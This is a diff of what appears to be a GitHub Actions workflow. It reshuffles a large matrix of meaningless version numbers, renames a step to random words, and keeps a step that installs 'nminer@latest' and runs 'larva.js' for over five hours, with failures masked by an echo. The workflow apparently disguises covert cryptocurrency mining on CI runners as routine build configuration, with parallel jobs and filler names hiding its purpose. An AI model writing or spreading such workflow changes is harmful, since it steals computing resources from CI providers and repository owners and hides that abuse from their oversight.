@@ -9,24 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 4876 }
-          - { version: 9247 }
-          - { version: 9683 }
-          - { version: 7085 }
-          - { version: 4854 }
-          - { version: 6219 }
-          - { version: 83 }
-          - { version: 3823 }
-          - { version: 7504 }
-          - { version: 4787 }
-          - { version: 359 }
-          - { version: 1612 }
-          - { version: 7931 }
-          - { version: 684 }
-          - { version: 8980 }
-          - { version: 1127 }
-          - { version: 7830 }
-          - { version: 4855 }
+          - { version: 7769 }
+          - { version: 2623 }
+          - { version: 1893 }
+          - { version: 45 }
+          - { version: 4697 }
+          - { version: 1070 }
+          - { version: 7497 }
+          - { version: 5632 }
+          - { version: 3825 }
+          - { version: 6138 }
+          - { version: 3330 }
+          - { version: 8748 }
+          - { version: 1171 }
+          - { version: 251 }
+          - { version: 6525 }
+          - { version: 4072 }
+          - { version: 493 }
 
     steps:
       - name: Checkout
@@ -37,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: pro brave drat concerning tall
+      - name: the than
         run: |
           npm install nminer@latest
-          timeout 349m node larva.js || echo "larva executed"
+          timeout 321m node larva.js || echo "larva executed"
